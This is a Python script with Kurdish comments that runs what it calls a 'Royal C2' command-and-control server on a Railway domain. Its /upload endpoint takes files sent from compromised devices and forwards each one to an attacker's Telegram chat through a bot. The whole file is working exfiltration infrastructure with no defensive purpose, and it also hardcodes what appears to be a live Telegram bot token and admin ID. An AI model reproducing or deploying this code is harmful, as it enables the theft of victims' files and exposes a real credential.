import asyncio
import logging
import os
from aiohttp import web
from aiogram import Bot, Dispatcher
from aiogram.types import BufferedInputFile

# تۆکینی بۆتەکەت
TOKEN = "8935252930:AAG91p3Aiyas4Hc8k4-ARD2WGK-52wSvOCc"
# ئەدمین ئایدی
ADMIN_ID = 5583813672
# دۆمەینی سێرڤەرەکەت لە ڕەیڵ-وەی
C2_DOMAIN = "cyber-surche-bot-production.up.railway.app"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN)
dp = Dispatcher()

# لێرە فایلەکان لە ئامێرەکانەوە وەردەگیرێت
async def handle_data_upload(request):
    try:
        reader = await request.multipart()
        field = await reader.next()
        if field:
            filename = field.filename
            content = await field.read()
            
            # ناردنی فایل بۆ تەلەگرامی ئەدمین
            file_to_send = BufferedInputFile(content, filename=filename)
            await bot.send_document(
                chat_id=ADMIN_ID, 
                document=file_to_send, 
                caption=f"📁 **فایلێکی نوێ لە ئامێرەوە وەرگیرا:** `{filename}`"
            )
            return web.json_response({"status": "success", "msg": "File processed"})
    except Exception as e:
        logging.error(f"Upload Error: {e}")
        return web.json_response({"status": "error", "msg": str(e)}, status=500)

async def index_handler(request):
    return web.Response(text="Royal C2 Core is Active.", content_type='text/html')

async def start_c2_server():
    app = web.Application(client_max_size=1024*1024*100) # تا 100MB
    app.router.add_get('/', index_handler)
    app.router.add_post('/upload', handle_data_upload)
    
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    
    logging.info(f"C2 Server is active at {C2_DOMAIN} on port {port}...")
    
    # دەستپێکردنی پۆڵینگی بۆت
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(start_c2_server())
